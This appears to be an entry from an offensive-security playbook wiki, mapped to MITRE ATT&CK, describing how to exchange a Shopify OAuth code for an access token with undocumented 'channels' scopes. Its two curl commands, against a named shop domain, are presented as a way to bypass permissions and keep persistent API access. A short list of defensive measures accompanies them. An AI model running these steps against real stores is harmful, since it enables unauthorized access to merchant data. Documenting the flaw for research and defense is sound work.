---
tags:
  - shopify
  - oauth
  - access-token
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/shopify-oauth-authorize-with-channels-scopes]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:32:01.767Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 8fbe8c0e-fcea-4f5d-ae22-0bdd37432874
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Obtain-Shopify-Access-Token

## Summary

This procedure exchanges the OAuth authorization code for an access token that includes the undocumented channels scopes, enabling unauthorized API interactions.

## Description

Following the authorization request, this step completes the OAuth 2.0 flow by posting the code, client_id, and client_secret to the access_token endpoint. The resulting token can be used for API calls to the channels beta API, bypassing required engineering permissions due to the scope acceptance flaw.

## Requirements

1. Authorization code from previous step
2. App client_secret
3. Target shop domain
4. HTTP client for POST request

## Defense

Defensive measures and detection strategies:

- Validate scopes against app permissions before issuing tokens
- Rate-limit OAuth token exchanges
- Audit token issuances for unusual scopes
- Revoke tokens on anomaly detection

## Objectives

1. Acquire long-lived access token with channels permissions
2. Prepare for API exploitation
3. Maintain persistence via token

## Instructions

### Step 1: Exchange Code for Token

**Context**: POST the authorization code to obtain the access token.

**Command** ([[commands/shopify-oauth-authorize-with-channels-scopes]] adapted for token):
```bash
curl -X POST "https://while42.myshopify.com/admin/oauth/access_token" \
  -d "client_id=fc49e813f5aad9c8d8f65117031a9684" \
  -d "client_secret=APP_SECRET" \
  -d "code=AUTHORIZATION_CODE"
```

> Response includes access_token; store it for header use in API calls.

### Step 2: Verify Token Scopes

**Context**: Optionally test the token with a known endpoint to confirm scopes.

**Command** (Basic API call):
```bash
curl -H "X-Shopify-Access-Token: NEW_TOKEN" "https://while42.myshopify.com/admin/shop.json"
```

> Expected: Successful shop info response.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques


## Commands Used

- [[commands/shopify-oauth-authorize-with-channels-scopes]]

## Tools Used


## Tags

- [[shopify]]
- [[oauth]]
- [[access-token]]
